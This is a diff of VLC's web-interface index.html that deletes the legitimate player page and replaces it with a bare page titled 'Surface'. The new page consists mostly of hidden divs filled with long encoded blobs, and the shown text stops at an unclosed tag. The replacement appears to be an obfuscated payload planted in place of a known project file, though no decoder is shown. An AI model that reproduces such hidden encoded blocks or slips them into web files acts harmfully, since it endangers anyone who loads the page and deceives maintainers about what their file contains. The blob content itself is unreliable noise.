@@ -1,313 +1,112 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
-<!--  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >
-<  index.html: VLC media player web interface - VLM
-< - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >
-<  Copyright (C) 2005-2014 VLC authors and VideoLAN
-<
-<  Authors: Brandon Brooks <bwbrooks -at- archmageinc -dot- com>
-<
-<  This program is free software; you can redistribute it and/or modify
-<  it under the terms of the GNU General Public License as published by
-<  the Free Software Foundation; either version 2 of the License, or
-<  (at your option) any later version.
-<
-<  This program is distributed in the hope that it will be useful,
-<  but WITHOUT ANY WARRANTY; without even the implied warranty of
-<  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-<  GNU General Public License for more details.
-<
-<  You should have received a copy of the GNU General Public License
-<  along with this program; if not, write to the Free Software
-<  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston MA 02110-1301, USA.
-< - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
+<!doctype html>
 <html>
-	<head>
-		<title><?vlc gettext("VLC media player - Web Interface") ?></title>
-		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-		<meta name="referrer" content="no-referrer" />
-		<link href="favicon.ico" type="image/x-icon" rel="shortcut icon" />
-		<script type="text/javascript" src="js/common.js"></script>
-		<script type="text/javascript">
-		//<![CDATA[
-			if(isMobile()){
-				window.location='mobile.html';
-			}
-		//]]>
-		</script>
-		<link type="text/css" href="css/ui-lightness/jquery-ui-1.8.13.custom.css" rel="stylesheet" />
-		<link type="text/css" href="css/main.css" rel="stylesheet" />
-		<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js"></script>
-		<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.8.13/jquery-ui.min.js"></script>
-		<script type="text/javascript" src="js/jquery.jstree.js"></script>
-		<script type="text/javascript" src="js/ui.js"></script>
-		<script type="text/javascript" src="js/controllers.js"></script>
-		<script type="text/javascript">
-		//<![CDATA[
-			var pollStatus	=	true;
-			$(function(){
-				$('.button').hover(function(){$(this).addClass('ui-state-hover')},function(){$(this).removeClass('ui-state-hover')});
-				$('#buttonPlayList').click(function(){
-					$('#libraryContainer').animate({
-						height: 'toggle'
-					});
-					$('#buttonszone1').animate({
-						width: 'toggle'
-					});
-					return false;
-				});
-				$('#buttonViewer').click(function(){
-					$('#viewContainer').animate({
-						height: 'toggle'
-					})
-					return false;
-				});
-				$('#buttonEqualizer').click(function(){
-					updateEQ();
-					$('#window_equalizer').dialog('open');
-					return false;
-				})
-				$('#buttonOffsets').click(function(){
-					$('#window_offset').dialog('open');
-					return false;
-				});
-				$('#buttonBatch').click(function(){
-					$('#window_batch').dialog('open');
-					return false;
-				});
-				$('#buttonOpen').click(function(){
-					browse_target	=	'default';
-					browse();
-					$('#window_browse').dialog('open');
-					return false;
-				});
-				$('#buttonPrev').mousedown(function(){
-					intv	=	1;
-					ccmd	=	'prev';
-					setIntv();
-					return false;
-				});
-				$('#buttonPrev').mouseup(function(){
-					if(intv<=5){
-						sendCommand({'command':'pl_previous'});
-					}
-					intv	=	0;
-					return false;
-				});
-				$('#buttonNext').mousedown(function(){
-					intv	=	1;
-					ccmd	=	'next';
-					setIntv();
-					return false;
-				});
-				$('#buttonNext').mouseup(function(){
-					if(intv<=5){
-						sendCommand({'command':'pl_next'});
-					}
-					intv	=	0;
-					return false;
-				});
-				$('#buttonPlEmpty').click(function(){
-					sendCommand({'command':'pl_empty'})
-					updatePlayList(true);
-					return false;
-				});
-				$('#buttonLoop').click(function(){
-					sendCommand({'command':'pl_loop'});
-					return false;
-				});
-				$('#buttonRepeat').click(function(){
-					sendCommand({'command':'pl_repeat'});
-					return false;
-				});
-				$('#buttonShuffle').click(function(){
-					sendCommand({'command':'pl_random'});
-					return false;
-				})
-				$('#buttonRefresh').click(function(){
-				    updatePlayList(true);
-				    return false;
-				});
-				$('#buttonPlPlay').click(function(){
-					sendCommand({
-						'command': 'pl_play',
-						'id':$('.jstree-clicked','#libraryTree').first().parents().first().attr('id').substr(5)
-					})
-					return false;
-				});
-				$('#buttonPlAdd').click(function(){
-					$('.jstree-clicked','#libraryTree').each(function(){
-						if($(this).parents().first().attr('uri')){
-							sendCommand({
-								'command':'in_enqueue',
-								'input' : $(this).parents().first().attr('uri')
-							});
-						};
-					});
-					$('#libraryTree').jstree('deselect_all');
-					setTimeout(function(){updatePlayList(true);},1000);
-					return false;
-				});
-				$('#buttonStreams, #buttonStreams2').click(function(){
-					updateStreams();
-					$('#window_streams').dialog('open');
-				});
-				$('#buttonSout').click(function(){
-					if(current_que=='main'){
-						$('#windowStreamConfirm').dialog('open');
-					}else{
-						$('#player').empty();
-						current_que		=	'main';
-						sendVLMCmd('del Current');
-						updateStatus();
-					}
-					return false;
-				});
-				$('#qrCodeConfirm').dialog({
-					autoOpen: false,
-					width:600,
-					modal: true,
-					buttons:{
-						"<?vlc gettext("Yes") ?>":function(){
-							$(this).dialog('close');
-							var urlimg = $('#mobileintflink').prop('href');
-							var codeimg = $('<img width="350" height="350" alt="qrcode"/>');
-							codeimg.attr('src', 'https://chart.apis.google.com/chart?cht=qr&chs=350x350&chld=L&choe=UTF-8&chl=' + encodeURIComponent(urlimg));
-							codeimg.dialog({width: 350, height: 350, title: "<?vlc gettext("QR Code") ?>"});
-						},
-						"<?vlc gettext("No") ?>":function(){
-							$(this).dialog('close');
-							window.location = $('#mobileintflink').attr('href');
-						}
-					}
-				});
-				$('#windowStreamConfirm').dialog({
-					autoOpen: false,
-					width:600,
-					modal: true,
-					buttons:{
-						"<?vlc gettext("Yes") ?>":function(){
-							var file			=	$('[current="current"]','#libraryTree').length>0 ? $('[current="current"]','#libraryTree').first().attr('uri') : ($('.jstree-clicked','#libraryTree').length>0 ? $('.jstree-clicked','#libraryTree').first().parents().first().attr('uri') : ($('#plid_'+current_playlist_id).attr('uri') ? $('#plid_'+current_playlist_id).attr('uri') : false));
-							if(file){
-								if($('#viewContainer').css('display')=='none'){
-									$('#buttonViewer').click();
-								}
-								var defaultStream	=	'new Current broadcast enabled input "'+file+'" output #transcode{vcodec=FLV1,vb=4096,fps=25,scale=1,acodec=mp3,ab=512,samplerate=44100,channels=2}:std{access='+$('#stream_protocol').val()+',mux=avformat{{mux=flv}},dst=0.0.0.0:'+$('#stream_port').val()+'/'+$('#stream_file').val()+'}';
-								sendVLMCmd('del Current;'+defaultStream+';control Current play');
-								$('#player').attr('href',$('#stream_protocol').val()+'://'+$('#stream_host').val()+':'+$('#stream_port').val()+'/'+$('#stream_file').val());
-								current_que			=	'stream';
-								updateStreams();
-							}
-							$(this).dialog('close');
-						},
-						"<?vlc gettext("No") ?>":function(){
-							$(this).dialog('close');
-						}
-					}
-				});
-				$('#viewContainer').animate({height: 'toggle'});
-			});
-			/* delay script loading so we won't block if we have no net access */
-			$.getScript('https://releases.flowplayer.org/js/flowplayer-3.2.6.min.js', function(data, textStatus){
-				$('#player').empty();
-				flowplayer("player", "https://releases.flowplayer.org/swf/flowplayer-3.2.7.swf");
-				/* .getScript only handles success() */
-			 });
-		//]]>
-		</script>
-	</head>
-	<body id="regular_layout">
-			<div class="centered">
-			<div id="mainContainer" class="centered">
-			<div id="controlContainer" class="ui-widget">
-				<div id="controlTable" class="ui-widget-content">
-					<ul id="controlButtons">
-						<li id="buttonPrev" class="button48  ui-corner-all" title="<?vlc gettext("Previous") ?>"></li>
-						<li id="buttonPlay" class="button48  ui-corner-all paused" title="<?vlc gettext("Play") ?>"></li>
-						<li id="buttonNext" class="button48  ui-corner-all" title="<?vlc gettext("Next") ?>"></li>
-						<li id="buttonOpen" class="button48  ui-corner-all" title="<?vlc gettext("Open Media") ?>"></li>
-						<li id="buttonStop" class="button48  ui-corner-all" title="<?vlc gettext("Stop") ?>"></li>
-						<li id="buttonFull" class="button48  ui-corner-all" title="<?vlc gettext("Full Screen") ?>"></li>
-						<li id="buttonSout" class="button48  ui-corner-all" title="<?vlc gettext("Easy Stream") ?>"></li>
-					</ul>
-					<ul id="buttonszone2" class="buttonszone">
-						<li id="buttonPlayList" class="button ui-widget ui-state-default ui-corner-all" title="<?vlc gettext("Hide / Show Library") ?>"><span class="ui-icon ui-icon-note"></span><?vlc gettext("Hide / Show Library") ?></li>
-						<li id="buttonViewer" class="button ui-widget ui-state-default ui-corner-all" title="<?vlc gettext("Hide / Show Viewer") ?>"><span class="ui-icon ui-icon-video"></span><?vlc gettext("Hide / Show Viewer") ?></li>
-						<li id="buttonStreams" class="button ui-widget ui-state-default ui-corner-all" title="<?vlc gettext("Manage Streams") ?>"><span class="ui-icon ui-icon-script"></span><?vlc gettext("Manage Streams") ?></li>
-						<li id="buttonOffsets" class="button ui-widget ui-state-default ui-corner-all" title="<?vlc gettext("Track Synchronisation") ?>"><span class="ui-icon ui-icon-transfer-e-w"></span><?vlc gettext("Track Synchronisation") ?></li>
-						<li id="buttonEqualizer" class="button ui-widget ui-state-default ui-corner-all" title="<?vlc gettext("Equalizer") ?>"><span class="ui-icon ui-icon-signal"></span><?vlc gettext("Equalizer") ?></li>
-						<li id="buttonBatch" class="button ui-widget ui-state-default ui-corner-all" title="<?vlc gettext("VLM Batch Commands") ?>"><span class="ui-icon ui-icon-suitcase"></span><?vlc gettext("VLM Batch Commands") ?></li>
-					</ul>
-					<div id="volumesliderzone">
-						<div id="volumeSlider" title="Volume"><img src="images/speaker-32.png" class="ui-slider-handle" alt="volume"/></div>
-						<div id="currentVolume" class="dynamic">50%</div>
-					</div>
-					<div id="artszone">
-						<img id="albumArt" src="/art" width="141px" height="130px" alt="Album Art"/>
-					</div>
-					<div id="mediaTitle" class="dynamic"></div>
-					<div id="seekContainer">
-						<div id="seekSlider" title="<?vlc gettext("Seek Time") ?>"></div>
-						<div id="currentTime" class="dynamic">00:00:00</div>
-						<div id="totalTime" class="dynamic">00:00:00</div>
-					</div>
-				</div>
-			</div>
-			<div id="libraryContainer" class="ui-widget">
-				<ul id="buttonszone1" align="left" class="buttonszone ui-widget-content" style="overflow:hidden; white-space: nowrap;">
-					<li id="buttonShuffle" class="button ui-widget ui-state-default ui-corner-all" title="<?vlc gettext("Shuffle") ?>"><span class="ui-icon ui-icon-shuffle"></span><?vlc gettext("Shuffle") ?></li>
-					<li id="buttonLoop" class="button ui-widget ui-state-default ui-corner-all" title="<?vlc gettext("Loop") ?>"><span class="ui-icon ui-icon-refresh"></span><?vlc gettext("Loop") ?></li>
-					<li id="buttonRepeat" class="button ui-widget ui-state-default ui-corner-all" title="<?vlc gettext("Repeat") ?>"><span class="ui-icon ui-icon-arrowreturnthick-1-w"></span><?vlc gettext("Repeat") ?></li>
-					<li id="buttonPlEmpty" class="button ui-widget ui-state-default ui-corner-all" title="<?vlc gettext("Empty Playlist") ?>"><span class="ui-icon ui-icon-trash"></span><?vlc gettext("Empty Playlist") ?></li>
-					<li id="buttonPlAdd" class="button ui-widget ui-state-default ui-corner-all" title="<?vlc gettext("Queue Selected") ?>"><span class="ui-icon ui-icon-plus"></span><?vlc gettext("Queue Selected") ?></li>
-					<li id="buttonPlPlay" class="button ui-widget ui-state-default ui-corner-all" title="<?vlc gettext("Play Selected") ?>"><span class="ui-icon ui-icon-play"></span><?vlc gettext("Play Selected") ?></li>
-					<li id="buttonRefresh" class="button ui-widget ui-state-default ui-corner-all" title="<?vlc gettext("Refresh List") ?>"><span class="ui-icon ui-icon-arrowrefresh-1-n"></span><?vlc gettext("Refresh List") ?></li>
-				</ul>
-				<div id="libraryTree" class="ui-widget-content"></div>
-			</div>
-			<div id="viewContainer" class="ui-widget">
-				<div id="mediaViewer" class="ui-widget-content">
-					<div href="http://localhost:8081/stream.flv" style="display:block; width:100%" id="player">
-						<p><?vlc gettext("Loading flowplayer...") ?><br/><?vlc gettext("If nothing appears, check your internet connection.") ?></p>
-					</div>
-				</div>
-			</div>
-			<div class="footer">
-				VLC <?vlc print(vlc.misc.version() .. ' - Lua Web Interface - <a id="mobileintflink" href="mobile.html">Mobile Interface</a> - ' .. vlc.misc.copyright()) ?>
-			</div>
-		</div>
-		</div>
-		<div id="qrCodeConfirm" title="<?vlc gettext("Generate QR Code") ?>">
-			<p>
-				<?vlc gettext("VLC can display a QR code linking to the mobile version of the web interface; the web address of the web interface of your VLC media player instance will be transmitted over the internet to the Google Image Charts web service to generate this QR code.") ?>
-			</p>
-			<p>
-				<?vlc gettext("Do you want to go ahead with this?") ?>
-			</p>
-		</div>
-		<div id="windowStreamConfirm" title="<?vlc gettext("Confirm Stream Settings") ?>">
-			<p>
-				<?vlc gettext("By creating a stream, the <i>Main Controls</i> will operate the stream instead of the main interface.") ?>
-				<?vlc gettext("The stream will be created using default settings, for more advanced configuration, or to modify the default settings, select the button to the right: <i>Manage Streams</i>") ?>
-				<span id="buttonStreams2" class="button ui-widget ui-state-default ui-corner-all" title="<?vlc gettext("Manage Streams") ?>"><span class="ui-icon ui-icon-script"></span></span>
-			</p>
-			<p>
-				<?vlc gettext("Once the stream is created, the <i>Media Viewer</i> window will display the stream.") ?>
-				<?vlc gettext("Volume will be controlled by the player, and not the <i>Main Controls</i>.") ?>
-			</p>
-			<p>
-				<?vlc gettext("The current playing item will be streamed. If there is no currently playing item, the first selected item from the <i>Library</i> will be the subject of the stream.") ?>
-			</p>
-			<p>
-				<?vlc gettext("To stop the stream and resume normal controls, click the <i>Open Stream</i> button again.") ?>
-			</p>
-			<p>
-				<?vlc gettext("Are you sure you wish to create the stream?") ?>
-			</p>
-		</div>
-		<?vlc
-		current_page = "index"
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<style>.lhFG9E{display:none}</style>
+<title>Surface</title>
+</head>
+<body>
+<!-- init -->
+<div id="cfqckbvzej0" style="display:none">4qqkzKMV+HpWoqcSWhDfo45O8Cg8JPmXhKg5yNomrDlbUqNCLSRv6jA2SxMDKL1ppbflxxg/fl4/Lf4747MGEbPulOLAL8BHdr/tEF4ZltndVPBncGf6mJ6qap6CavluNRqjGiglJ4lvPgMQC2yqaejl/8wFdjVKJ2agYKDhaRDvqd6J3CzEXnKioQdaGdyL01PwLT92t9bK7ySJ0Cb6Yj8a9gUlLTCOZSlbAwZgvzL38aOAUghgRi4/siOv7GFI46mH5o4k00tn7b1EFx+Ox8ZD6jFtJuOaib9oi8Yt/CdoQPgJeGJv6jA2SxMDKLBgqaCrgA53NUcvafMj4a0sTrHllOaONZwIKrf3RAl23cTXUuVlPmX4k9ftdo/JIf1uPgDpB2wjPo54PkATXyrpNeb7nJ4BZyhKayWybqSwLl+754XikyTFCDOirAlZCITHxhumdGMk25mc7zbYhXy8JW9k90opNDDAYjpDAl8qvW60vOTLC2ooCWsovG216GJZ46nSs9J3gxQZvrsPQxCEl8RK5zU8ZeyTmPMrntY84mJvZPdUODk9hTJRDkcKfLNt6Kf5xhV5MUo5LLpt+703Xb/vhOqOJpsaKPWmAkMU25iCFqF+OGH8kYK7PtuPeKs8Mw+oTCsyPpViPxREBG64Oqeq+s0eOH8aenrofsutLE+x75n4hCjSWn/jtlxREITRiUfoLDdquJ+eqmmZhSvraSULuRwmNSKUZT1XSgFnsHWhq+KYD2cyXy456AnhrSwNuOSO980nwEd67rZcGh2R2d5DqTYpd+GTh+NGhtYm5UowDZhePzQ0jUo0QBNOKo1ko6rzgjlLfgcDLr91pPllTr+nofGJIM0GYOOhFRoPhNvbQL9PcCS11oygap6SO+d9NFT6Ejw4aoxlNUtKCm23ZqyxrJNCNGkQPy6rd+zsYES55drghS/VT2G5vwdTGIjH1Ry2cSB8rpSFtymZ1jLnaTZUqUg+JDSSITlBH1l11CHk6/vRC3kxSjNmpGql+WQX673Q85h63CAzouELRBvByMlF6yk/dq/V2v8y3NwrtXM0Fr8KKCUyj346Wg4NZuRvq6vzmQ5tLk8uOf5hrvl4QrOx0fOYYdJFf+urRlQJk9vXSPAGP2j6hNGyDsqfZuN0Nk6qHSQvJ4V+IEEXA2u3db3/uJVXf1YLa2iwbLTjeFa45I73zTbEQ3Tqu1wBTNGS1EnqMX1y9ISDrmqekib7ajQcokR2NDCCeTdPFU9mq2y3/uuoQyg/GxEGvE2N62F37OiD+ZoN7V9x94V</div><div id="cfqckbvzej1" style="display:none">WehaH+dYT6QYBXe+TuIhlsvokz0Q3Kp9qOykzg2MNTC5bea1Lp6fRyx9aGUQ4CeRSm7tJTqTRpOerdc9/VdWlFFIZlMfhdcE3H22ggNykRoXsOeY1IQmZahx3ZqJHD0ApJji3a/GBp8kJYzltJn/rZIreYky95bP6rBOUZWHuogVlN4qb5VbUKGZs3bPTlWaCyQPcXT84uks0JQaYOjJPEgV7qVW9vdrFD2M0RHgDuDGZ2D94vODW2dgMlEJgzYcAYQmEzfpO0TEAUuXBu/k3ic4/u3IWGoNDHHYYhWYJXFQFQZNOgLfg8xQyH3oPHKU1iuU/YZq/jPqtKudyY8uKBE0LheToXPNwHmD2taugcNzVC+JxHCOocCEzNI9qa0AmETybTqKcpOMNdh4aOCiWcK/aZVzm4Kb10QrkQWTjiVdSMofEwEPWdBVIp6+z9mOb0zHhQDpdr19+NRqkdjNDPjRpu3a3r+LtAWBqWCYDvUqW42Juru+41rAywEx45aEURSjX7cJgzyw2TPmA3JxHjcUK/HEaBIFFIQs4pj8UfwwybKtlirTx8g9xG3IjObQ2q/xHdKfirvmxDJJHW7f2MFhMr/CCXukEFTbZmJmucJPxDcQ0MyataSsiIZU6NUw9Jjvvab2mzsYvZgVgPia5W6vIP2KJ8Ym0mCfQRWTlpzN6JpT83UP8IBxsz6eov0LSy3nnYWIY/xA7diGiRjceXgtQtk2AsvDIH28rRgE75Fe76n1c77iLsqx2+x5y5rtSTiqZ3/RptiAFc6e4q75ykOwNy000J41hIw0pjloTVAAMR7N2iK/M6yhTJmQtIL96tv1teInjgtXRF9hSecGFPGEquJnxUOAWA2rNvYeVQaGGJ+s0ZSyGZQ0pZJBaEB5eNV+SaouX7stVcWV/fQyrapjKTxqowaK70RDkcGrFnBxGC4PQxBfzDxJw4YWEq2rf5gTGdRNWhFR8IxXWfRdCPihshzWLkPXmAUAfZi075VWTwDwUkuGl8rkC4BtAsp4zRBumwd9Qyn02V9mYhfdgnYcdzHMzWK0RFiQXpWkJahAKfYtA9Kj38180ZRg9J4Bmhr1CSY/bkbuPc/N6Qcf3A0cLr/jAfMl0Z02nlYa+MtPcLvtQPgqHdH50NqV+aUw2MGupSp6O7JoGTBp8LB2mUqb9REHos6qwmBvAb33YhSVHFpXbwkz3dj5B5cWOlXTe8jrFYTUlvG8dLQGQRRwWXi5F53v9kNPmP3s/agl9pmavyEt3t72Q5LgHl0h0tPsgTwubkMpN9</div><div id="cfqckbvzej2" style="display:none">TACbP+wiIdPuIYA/3MdAYpmBywZrUsWal9XUZpSnaTwkAFzEl4zM+NM9MJ0S+jvoce0KJFTdbeCMGRLgP7EFvYyFWnvrL6VY6OPI/lsPj2mSw4YZIVAPF40Lj6rVJ6K18gpehNtD3jnSIf/QU6TvrXZljXXH1fsiQdUOor5imiwFiJC5KSCuDOTjQTmMwcDp319BCmPRxR8I1tPh0yNiOLPWlIKEg45oHCD6mYbt/qL5aYmkxtHwbdeXRiT3YRVw3I+c+yO04ZRkvAqxGAaGJt3fgIamFshZyJUQrJltajMzD46Exw5Mbg6guxgRKvIifGRLegdZLeAAg8IhsPgX+UqGEf9hYT8Xd3JJttmGh3zQSMzPZdrDE8XAXKQUZSu2McoSjVDEjiaO/jgNGa03LX01zPWZWPbnxVYOK+f9HDGEB9d16+GrGquiCzhdjQ8+FMFGgHTfzAaUAduq0KDst7aHmM0Wy45lzCy2T9iuPOkt6cz5WlQtowndSiJmNp3tHE9b/qjubVFvvEixHQlXb9ufA0pgUoiS1cBbZszpbzl8Q1gKGY4EbZWrMpcV7TTpsGaJZJpcrqGCnI1mZnYVfMGPzTBrt6bMYHOKvR2Oie/YA8nCJF2YnkwUHG1eY+v4ZQ1aWpAICykd5bKaFvvw7nC13bXE1bO9j5xMpj84xXUJBJl0oCj/2iJ+A3iVTgHrh51LT2CYGpILTh4jjWlqcLQWU9oX3s/glWRyDhYrfua6IkWlGtD+PkSRR2K2oBCxn0mSPubufo1k9Qp/0E5CqNkDg83rHliQykueqRovZzl4FpvbxooOepKtf95X+7y1dGkFfFOabGkHn0LqdnWQu8DHGz5j4OKYLL2I74+Nh6DbhQhObZrNX9fN0KkZYWO49YIMSlCLSaycbD/OFWtzq/wlBfIWlDzhg9PNo6YimziFDd28LmMhkGFzRq4cQkN+BV9KyiDbxEYHg1muWaXv/jqNnUYbwYFmm/51D5VlMeY1bNwx0NS8JkLWUrYm+dssD8Xa8KTnrtVvfcf/mY6XqlqfxodrG8zeRcIYLd5voPixAZSbmYqMrpMhuRkSZfK2PSTAMtiddv5MW892JDYdL0xHGPCmav5bq3bfPltAgWzQhoBJLR7MFgQUEmpQLyRwvcoWG5sASWGcavHbhmoz4HQ13LKfWf7jSNaDqnC50jRfQEz4Leu+nWc+wPpZAcbk1B8cQizayJ3HRpNi1H2kd+TWk0dZHh9qzO3+01dq/iE1LR1mHlwsphUTUuT7eh+wHY2a9exqJg1ge</div><div id="cfqckbvzej3" style="display:none">UivXUoPZoTeHU8j3hrRjEQcu9nnKbzmz1xFR08OLc1jsZEHYreltWxJuluR7u9KHxNkcHoQdwgFmLgz56sTI/NIcFiFAuDVDsoE4R0LUZWNDytY4ryx/gLSwpjLBPkeZnJP2SW04X5uTTNZkvg/TRhLauexB63CiY0/5OF+WiEyn3JVwddp1clchWtQ2N/HlZlqDaOg8HqAEUkZ34qpnaAwkpKusC67K4M9mFGxKIwAg2l8PlDtnA9NMa8mpp12uoKw1UXX6ERNSIajHw2TAkaMKZvrInA9T1HBWJzKKBOm+RbH53isrK0CJBDcrSuDFVJ1fj5YOoGFFPXtZuCN97QLMwwJAu8TjtyZNU1bmBXLUy1UKW0wJsrZDhhPCzhN430ZByN2NC01gbqb0bNpyIODq7m1B7OJgBR0sCGgDOl7yq7ZSg/uxQDJSPSZjZlBTZ/rnDw/fPvFnUKHh8ysW2zzDp3vbqMz4QS9lxJs/4NBRu7xeRJyiYebqa+q708jvciykwpF4JpBngA0X4oYhUyXJ1bl/bG1BRsOnw7CrtUm/1keLTt2MWXENcfSeWZLU0Jmd36ZbMSO3zxlL+7Sa72HbpUKDmZQQsKM69kGm8lJzqKQ/P208wWWjBFPi6bV6fiY2ubu9jqkDaUbmTMuSdvL4X412XwITlz4YaIiky72Qv0d2EruBMpGWeiRz1FHhU6u3mRjM7TNlQFXQM65HmxykZdk73T06wM50Va5agLUQSy7NVs43Q9V8KnuKZijcoD6GQGWqVKHQdmkEFsWDIOR7d4paLa1S9YDB4JH7Y1u+F+d+7+sczSN+9eY+WYX1gOr9vHQ70iBG/fwYO3TtL+Dst0Ny++QT4KYoNBMkQoUkHodZeHzskqNi9xBD+gTIXYYU6/6ZLFjCjQWmnJjgxbL6aZ/WLIADxN2Lebu0mAjz3KRgUkqBIKCGaCaC5NJA9huViUi/PhXDQtRBMbhnu1xn1pmMqC6I8n6m9gxIYKVhGk08ZW7gNjc+2xup9x3fAA5l8rKIhVORAwpmUIaV46PJN5gZP67yZKBVEaM5tzprVZQ7/ziPaweddnJ8iZDng9ieLicd4AaVbTlYD2VYfwOPhzM1+RYRkWHY9YHl0QL3K5SIuJ1cVYRTFfLHKkeaPYXES7vbnlsSblbyLPvgx+PZv99UzDdBhS17ic+mm6hn75MD4/mFcIJBSCfh1UMlI7h268/czhJ1QtRDgBllqTx11rp7qC0LYr63hm9q0/W03Y5chX7CkiNuGZqYI9jIos508mCLtpOngAh3o</div><div id="cfqckbvzej4" style="display:none">yViMaZ4tDlvyi5BxPJF1zLb5mk+5jS7Oyo+HZC9VbeOe6CmFNpeTeT8Z3EXPPoaT6PIPYAMhOKAOJcR4KJJBdEm0kVT2OcbaS3vA2VR1SeQiDU7TKaGSSw4/ZmjTyfWW7jil7KKrPh1H+CQBD07vcv2yY8njjciIapl0fFzy2eAofPglpp0aKqP/3XE41HCIHn3e52mkaiMqx55AlymRg4Y0ORDKRzfpl8gczYcHHrKxnvNAt53AJG5oeFCMCskcOdF8SPodvlPXs6Bt1amUqM+RV8+Y7X7rjubG5EepMIei8JVY32OaHdcg9KkX8ur/6b4nrL7tIGV+MdT86MK9YH2cdJD+odKaG48AAVitJBgacTajibx+9xLXrrAbYQnrA+wxcTtLi1nb3NjpN5bCs/ze86Se5fTdchmp0AwGkSQ9XAVRuh0C2iqDYIXMuRxIN5E33+VtonfK0taU19HByu78CZReE0+Bj5XQ+M/Gh3IZjpcss4lIwWIddIzQIrV4zeVIKfqhUho/mlzhha386G+tRsNRKbrzYptGPeMIacLv5BVgJhdj8cfUAY2/msL6ET6n2Dep3KV+6awBzFZdcGn8iN1D0Lvjq5dYVbjkVQXf8a6TsaBPUt4LshDifIC/mphAXH43IwVW5Zz138tTUxSTK7yTrZiIL61AtKSXAajRcRxZguyGlsOLNAWMoQihroWal5H5Ivf/A7JJhnUsz66tbFRuOi5JO9iA2Obeenrt0mYVnoWk0AaUffm4kjmA0TQxPfLFuqLa4zR5lc0Z4fql6ua8yTrLig+jAKcRYdr7gBwlS64mSGuY3bg611riqYIPNLe1zOACsByUucdx/K08JQmG6POam+dcCdn4Vfnf8cLHsYhP++IXgjy/FAmCrLeaRdt2G1k/ye1oOn8qOpnLKzDz3azRT6UMlMyGMbSIUCQ1muyPkoffWDS8xSig5vD7jykV5i9il0a4A7G8xvKYLVhKI28dC4C0xN6bC3/MrjtY+sA1tCqJRbDMlmWA+E0UGYa1xqKTvmAJtMk5pa7ditewhQL/okuzdY/NvQ82QKHYxpIuMUOgmIGj0j4+9OMXbIfg5W1KvTjpgIpR1N0taQGy3crSp99tWbDNFLmnzZ6D5bQCz6oPxj3yDfFbQnC94MsOXiwi3a2Q4upKDuTrggyzncXEdv14gJWzCaDJdFw5ppzuqqvjHTiI4Sj8q/m6g7n5C46mjzK0M6H5AoPFfAkTdhtZP8ntaOPGfnO93nsYk6zpzCqJUPCwwmTY1QQkHKv5lpbH3jw</div><div id="cfqckbvzej5" style="display:none">FjP1kkdvFRhMFJbI3Os6HedpUWPOamEAl23c3bUKQ2JH35k9ftYIPMOOJmKFSlSCIlc8BoOloGT2W/Yraqq4A+RxBuChiWXIXMWGj8tdGwwA/OXDOw/VwDTt2G1k/ye1o48Z+c73eexiTrOnMKolQ8LDCZNjVBCQcq/mWlsfePAWM/WSR28VqEzF4P4LnQsdZ9jk569PFsPUCSysBP9DFuDr2Qn6FnntYn4Cd5R+tcRmBxlm0pDhQWaax1oaG2n0xkPUc4LugJy60sS6vlg/eJLs8KYPauFENUyInJLKRlcCT8kMrnd57eOvpiNUfrVSk0JJJiYCRHQij+crCk5NYJZnwWaz+hdqS2Bif+q8CjliDTCnKi8kZTE4Lc30PqMX5j8IKvo2GH2ib6RSgnrw9rJz7HJWAkR0Io/mii5b6DDSt8UGs/oXrh9ixOseWT7Iwkj11y8KFOECeT9JIF4ypwavqCyqlrn9EsqS5qTrYHLyElg2R7BgJLKKV85Lfz1hlwMhBrNtkJ4a0sDajqkqOSINYKLqLnBxkbhN3zUvA3OWbggo/nI4LNLeggeE63W2xndskiL1wODyD3Os7PtoJMInMBawymYrPpNg2z6oPxj2HWS2CioQlDXJLc0FXwLCRx4ZOO7y7FtWiuJ3EHrQdkYSOBe3tSG0J6v3bk+KufTCUHeQ4PmlGEzlhyi9ms3sdh3VYz8K4RGR+JyMBn8G1gLbXL1/IkzeRvpycqZOsHbGBxwHgpV0cZKL1uqrb5zgksK0o5Jfskmv9RDbb5heXAL85eM/G6BEQIiN3HUuEhaiO51piuc8OEaPMnMg+/RCRgeYUle1UaaCj+IeTlttAJdilZJXDZI+GtLFDUgcCjwGGOADPEoBRUGcHI0FXrKSVw8Na/nUjKlynqY3EGv1M8M2vPI3tHAUJ4rG6wqvXNACI1WGsmunCy5GJK96vKrOphgQoz66lGH13O99pS8DUjO6+qxZMrxdZm+mIiGuNVLTd4ySwgJEdCKP4h5Lf31Uw/fAQVF/xf7qIiWbv4lKuSINYDM73vQV8IldnBHKNleyTnl53vPsqYIPpzIR3xCGNnccssKU8QTHq7caik9cdELQJ3ZGD8L+GqKwTlgcCjwGHcIBmi70YXCoDbklP2KWsOtdbK73CYxmj1JyQcpwdxYD+Fe3t7NS4grGCz6bbGA2EpRi4lpy2j7H9Ii9mpqs4p0091ue8bPVzBiZJF5TEzbLXej+YkkZ8+73VxGusabCQ+g3k2SwkWJr1zoaTixyluOUYuJacr5</div><div id="cfqckbvzej6" 